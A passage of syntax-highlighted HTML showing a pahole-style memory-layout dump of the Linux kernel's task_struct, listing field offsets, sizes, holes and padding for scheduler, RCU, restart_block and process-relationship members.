</span></span><span class="line"><span class="cl"><span class="cm">/*  952      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_remote</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  960      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_affine</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  968      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_affine_attempts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  976      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_passive</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  984      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_idle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  992      |     8 */</span>        <span class="n">u64</span> <span class="n">core_forceidle_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 24-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):  256 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">stats</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1024      |     8 */</span>    <span class="k">struct</span> <span class="n">hlist_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1024      |     8 */</span>        <span class="k">struct</span> <span class="n">hlist_node</span> <span class="o">*</span><span class="n">first</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">preempt_notifiers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1032      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">btrace_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1036      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">policy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1040      |     4 */</span>    <span class="kt">int</span> <span class="n">nr_cpus_allowed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1048      |     8 */</span>    <span class="k">const</span> <span class="kt">cpumask_t</span> <span class="o">*</span><span class="n">cpus_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1056      |     8 */</span>    <span class="kt">cpumask_t</span> <span class="o">*</span><span class="n">user_cpus_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1064      |  1024 */</span>    <span class="kt">cpumask_t</span> <span class="n">cpus_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2088      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">migration_pending</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2096      |     2 */</span>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">migration_disabled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2098      |     2 */</span>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">migration_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2100      |     4 */</span>    <span class="kt">int</span> <span class="n">rcu_read_lock_nesting</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2104      |     4 */</span>    <span class="k">union</span> <span class="n">rcu_special</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2104      |     1 */</span>            <span class="n">u8</span> <span class="n">blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2105      |     1 */</span>            <span class="n">u8</span> <span class="n">need_qs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2106      |     1 */</span>            <span class="n">u8</span> <span class="n">exp_hint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2107      |     1 */</span>            <span class="n">u8</span> <span class="n">need_mb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="n">u32</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu_read_unlock_special</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2112      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2112      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2120      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu_node_entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2128      |     8 */</span>    <span class="k">struct</span> <span class="n">rcu_node</span> <span class="o">*</span><span class="n">rcu_blocked_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2136      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rcu_tasks_nvcsw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2144      |     1 */</span>    <span class="n">u8</span> <span class="n">rcu_tasks_holdout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2145      |     1 */</span>    <span class="n">u8</span> <span class="n">rcu_tasks_idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  2-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2148      |     4 */</span>    <span class="kt">int</span> <span class="n">rcu_tasks_idle_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2152      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2152      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2160      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu_tasks_holdout_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2168      |     4 */</span>    <span class="kt">int</span> <span class="n">trc_reader_nesting</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2172      |     4 */</span>    <span class="kt">int</span> <span class="n">trc_ipi_to_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2176      |     4 */</span>    <span class="k">union</span> <span class="n">rcu_special</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2176      |     1 */</span>            <span class="n">u8</span> <span class="n">blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2177      |     1 */</span>            <span class="n">u8</span> <span class="n">need_qs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2178      |     1 */</span>            <span class="n">u8</span> <span class="n">exp_hint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2179      |     1 */</span>            <span class="n">u8</span> <span class="n">need_mb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="n">u32</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">trc_reader_special</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2184      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2184      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2192      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">trc_holdout_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2200      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2200      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2208      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">trc_blkd_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2216      |     4 */</span>    <span class="kt">int</span> <span class="n">trc_blkd_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2224      |    32 */</span>    <span class="k">struct</span> <span class="n">sched_info</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2224      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pcount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2232      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">run_delay</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2240      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">last_arrival</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2248      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">last_queued</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sched_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2256      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2256      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2264      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2272      |    40 */</span>    <span class="k">struct</span> <span class="n">plist_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2272      |     4 */</span>        <span class="kt">int</span> <span class="n">prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2280      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2280      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2288      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">prio_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2296      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2296      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2304      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">node_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pushable_tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2312      |    24 */</span>    <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2312      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2320      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2328      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pushable_dl_tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2336      |     8 */</span>    <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2344      |     8 */</span>    <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">active_mm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2352      |     4 */</span>    <span class="kt">int</span> <span class="n">exit_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2356      |     4 */</span>    <span class="kt">int</span> <span class="n">exit_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2360      |     4 */</span>    <span class="kt">int</span> <span class="n">exit_signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2364      |     4 */</span>    <span class="kt">int</span> <span class="n">pdeath_signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2368      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">jobctl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2376      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">personality</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2380: 0   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_reset_on_fork</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2380: 1   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_contributes_to_load</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2380: 2   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_migrated</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  5-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 0   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_remote_wakeup</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 1   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_execve</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 2   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_iowait</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 3   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">restore_sigmask</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 4   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_user_fault</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 5   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">no_cgroup_migration</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 6   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">frozen</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 7   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">use_memdelay</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 0   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_memstall</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 1   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_eventfd</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 2   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">pasid_activated</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 3   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">reported_split_lock</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 4   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_thrashing</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2392      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">atomic_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2400      |    56 */</span>    <span class="k">struct</span> <span class="n">restart_block</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2400      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arch_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2408      |     8 */</span>        <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)(</span><span class="k">struct</span> <span class="n">restart_block</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |    40 */</span>        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                40 */</span>            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |     8 */</span>                <span class="n">u32</span> <span class="o">*</span><span class="n">uaddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2424      |     4 */</span>                <span class="n">u32</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2428      |     4 */</span>                <span class="n">u32</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2432      |     4 */</span>                <span class="n">u32</span> <span class="n">bitset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2440      |     8 */</span>                <span class="n">u64</span> <span class="n">time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2448      |     8 */</span>                <span class="n">u32</span> <span class="o">*</span><span class="n">uaddr2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">futex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                24 */</span>            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |     4 */</span>                <span class="kt">clockid_t</span> <span class="n">clockid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2420      |     4 */</span>                <span class="k">enum</span> <span class="n">timespec_type</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2424      |     8 */</span>                <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 8 */</span>                    <span class="k">struct</span> <span class="n">__kernel_timespec</span> <span class="o">*</span><span class="n">rmtp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 8 */</span>                    <span class="k">struct</span> <span class="n">old_timespec32</span> <span class="o">*</span><span class="n">compat_rmtp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2432      |     8 */</span>                <span class="n">u64</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">nanosleep</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                32 */</span>            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |     8 */</span>                <span class="k">struct</span> <span class="n">pollfd</span> <span class="o">*</span><span class="n">ufds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2424      |     4 */</span>                <span class="kt">int</span> <span class="n">nfds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2428      |     4 */</span>                <span class="kt">int</span> <span class="n">has_timeout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2432      |     8 */</span>                <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">tv_sec</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2440      |     8 */</span>                <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">tv_nsec</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">poll</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 24-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   56 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">restart_block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2456      |     4 */</span>    <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2460      |     4 */</span>    <span class="kt">pid_t</span> <span class="n">tgid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2464      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">stack_canary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2472      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">real_parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2480      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2488      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2488      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2496      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">children</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2504      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2504      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2512      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sibling</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2520      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">group_leader</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2528      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2528      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2536      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
